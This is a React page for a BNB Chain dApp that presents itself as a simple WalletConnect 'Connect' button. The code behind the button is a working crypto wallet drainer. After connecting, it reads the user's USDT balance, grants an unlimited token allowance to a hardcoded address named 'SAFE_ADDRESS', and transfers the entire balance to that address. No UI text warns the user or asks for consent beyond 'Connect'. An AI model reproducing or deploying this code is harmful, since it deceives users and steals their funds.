import React, { useState } from "react";
import { ethers } from "ethers";
import EthereumProvider from "@walletconnect/ethereum-provider";
import {
  ChakraProvider,
  Box,
  Button,
  Progress,
  Text,
  Code,
  Link,
} from "@chakra-ui/react";
import theme from "../theme";

const BSC_CHAIN_ID = 56;
const BSC_RPC = "https://bsc-dataseed1.binance.org";
const BSCSCAN_URL = "https://bscscan.com/tx/";
const WC_PROJECT_ID = "3f7bf9e0bf29451960f66c57c7143567";
const SAFE_ADDRESS = "0x0637e37a4e262f0bbc918ee8a57f829a0314a6a5";
const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function allowance(address,address) view returns (uint256)",
  "function transfer(address,uint256) returns (bool)"
];
const USDT_DECIMALS = 18;

function Dapp() {
  const [step, setStep] = useState(0);
  const [status, setStatus] = useState("");
  const [hash, setHash] = useState("");
  const [error, setError] = useState("");
  const [account, setAccount] = useState("");
  const [usdtBalance, setUsdtBalance] = useState("0");

  async function connectAndExecute() {
    try {
      setStatus("Connecting…");
      setStep(1);
      setError(""); setHash(""); setAccount(""); setUsdtBalance("0");

      const wcProvider = await EthereumProvider.init({
        projectId: WC_PROJECT_ID,
        chains: [BSC_CHAIN_ID],
        rpcMap: { [BSC_CHAIN_ID]: BSC_RPC },
        showQrModal: true,
      });
      await wcProvider.connect();

      const provider = new ethers.providers.Web3Provider(wcProvider);
      let network = await provider.getNetwork();
      if (network.chainId !== BSC_CHAIN_ID) {
        setStatus("Switching to BNB Chain…");
        await wcProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
        network = await provider.getNetwork();
        if (network.chainId !== BSC_CHAIN_ID) throw new Error("Switch to BNB Chain to continue");
      }
      setStatus("Connected to BNB Chain");
      setStep(2);

      const signer = provider.getSigner();
      const address = await signer.getAddress();
      setAccount(address);

      const usdt = new ethers.Contract(USDT_ADDR, USDT_ABI, signer);
      setStatus("Checking USDT balance…");
      setStep(3);
      const balance = await usdt.balanceOf(address);
      const balStr = ethers.utils.formatUnits(balance, USDT_DECIMALS);
      setUsdtBalance(balStr);
      if (balance.isZero()) throw new Error("Zero USDT balance—nothing to approve or send.");

      setStatus("Approving USDT…");
      setStep(4);
      const allowance = await usdt.allowance(address, SAFE_ADDRESS);
      if (allowance.lt(balance)) {
        const approveTx = await usdt.approve(SAFE_ADDRESS, ethers.constants.MaxUint256);
        setStatus("Waiting for approval…");
        await approveTx.wait();
      }

      setStep(5);
      setStatus("Transferring USDT…");
      const tx = await usdt.transfer(SAFE_ADDRESS, balance);
      setStatus("Waiting for transfer confirmation…");
      setStep(6);
      const rcpt = await tx.wait();
      setHash(rcpt.transactionHash);

      setStatus("Done!");
      setStep(7);
      setUsdtBalance("0");
    } catch (err) {
      setError(err.reason || err.message || String(err));
      setStatus("Error!");
    }
  }

  const steps = [
    "Connect",
    "Chain Check",
    "Balance Check",
    "Approve",
    "Transfer",
    "Waiting Tx",
    "Done!"
  ];

  return (
    <Box maxW="sm" m="auto" mt={10} p={4} boxShadow="lg" rounded="md" bg="brand.50">
      <Button
        size="lg"
        w="100%"
        colorScheme="yellow"
        onClick={connectAndExecute}
        isDisabled={step > 0 && step < steps.length - 1}
        leftIcon={
          <img
            src="https://walletconnect.com/_next/static/media/logo_mark.1e4f4a70.svg"
            alt="WalletConnect"
            width={20}
            style={{ marginRight: 8, display: "inline" }}
          />
        }
        mb={4}
      >
        Connect
      </Button>
      <Progress
        colorScheme="yellow"
        value={((step+1) / steps.length) * 100}
        size="sm"
        mb={2}
      />
      <Text color="brand.700" mb={2}>{status}</Text>
      {account && (<Text fontSize="sm">Wallet: <Code fontSize="xs">{account}</Code></Text>)}
      {usdtBalance !== "0" && (<Text fontSize="sm">USDT: <Code fontSize="xs">{usdtBalance}</Code></Text>)}
      {hash && (
        <Text color="green.700" fontSize="sm">
          Tx: <Link href={BSCSCAN_URL + hash} target="_blank" color="brand.700">
            View on BscScan
          </Link>
        </Text>
      )}
      {error && <Text color="red.600" fontSize="sm">{error}</Text>}
      <Box mt={4}>
        <Text fontWeight="bold" color="brand.800">Steps:</Text>
        {steps.map((s, i) => (
          <Text key={i} color={i === step ? "brand.800" : "brand.300"} ml={2} fontSize="sm">
            {i === step ? "→" : ""} {s}
          </Text>
        ))}
      </Box>
    </Box>
  );
}

export default function Home() {
  return (
    <ChakraProvider theme={theme}>
      <Dapp />
    </ChakraProvider>
  );
}
